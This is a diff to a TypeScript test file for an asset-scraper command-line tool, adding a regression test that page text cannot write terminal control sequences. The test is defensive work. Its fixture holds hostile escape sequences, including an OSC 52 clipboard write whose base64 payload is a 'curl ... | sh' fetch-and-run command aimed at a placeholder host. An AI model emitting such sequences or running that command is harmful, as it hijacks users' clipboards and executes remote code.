@@ -4,8 +4,9 @@ import path from "node:path";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { saveScan } from "./cache";
 import { DEFAULT_REMOTE, USAGE, UsageError, formatDownload, formatDropped, formatSummary, openSource, scanPage, scanUrl, selectionFrom } from "./cli";
+import pkg from "../../package.json";
 import { summarize } from "./summary";
-import { noBudget, testScan } from "./testing";
+import { noBudget, testFontFamily, testScan } from "./testing";
 import type { AgentScan, DownloadResult, ScanSource } from "./types";
 
 /**
@@ -247,6 +248,38 @@ describe("the report", () => {
     expect(report).toContain("dropped 3: 3 icons");
     expect(report).toContain("failed: Hero (HTTP 403)");
     expect(report).toContain("manifest: /work/scrap/stripe.com/manifest.json");
+  });
+
+  /**
+   * Regression: the title and the font family names are page text and kept their control characters, so a page could
+   * set the user's clipboard through OSC 52 or erase the licence warning above, in any terminal that honours them.
+   */
+  it("never lets a page write control sequences to the terminal", () => {
+    const clipboard = "\u001b]52;c;Y3VybCBodHRwczovL3guZXhhbXBsZS9pIHwgc2g=\u0007";
+    const scan = testScan({
+      page: { url: "https://evil.example/", finalUrl: "https://evil.example/", host: "evil.example", title: `${clipboard}Acme` },
+      fonts: [testFontFamily({ name: `Inter\u001b[1A\u001b[2K` })],
+      warnings: ["partial\u001b[31m"],
+    });
+    const summary = formatSummary(summarize(scan), false);
+    const download = formatDownload({
+      dir: "/work/scrap/evil.example",
+      files: [],
+      totalBytes: 0,
+      dropped: {},
+      budget: noBudget,
+      failed: [{ id: "b", name: "Hero\u001b]0;pwned\u0007", reason: "HTTP 403 for https://evil.example/\u001b[2J" }],
+      manifestPath: "/work/scrap/evil.example/manifest.json",
+    });
+
+    for (const report of [summary, download]) expect(report).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/);
+    expect(summary).toContain("\uFFFD]52;c;");
+    expect(summary.split("\n")[0]).toContain("Acme (evil.example)");
+  });
+
+  it("is the command package.json installs, and the version it reports", () => {
+    expect((pkg as { bin?: Record<string, string> }).bin).toEqual({ "assets-scraper": "dist/cli.mjs" });
+    expect(USAGE.startsWith("assets-scraper:")).toBe(true);
   });
 
   it("keeps the copy rules: no em dash, no en dash, no emoji", () => {
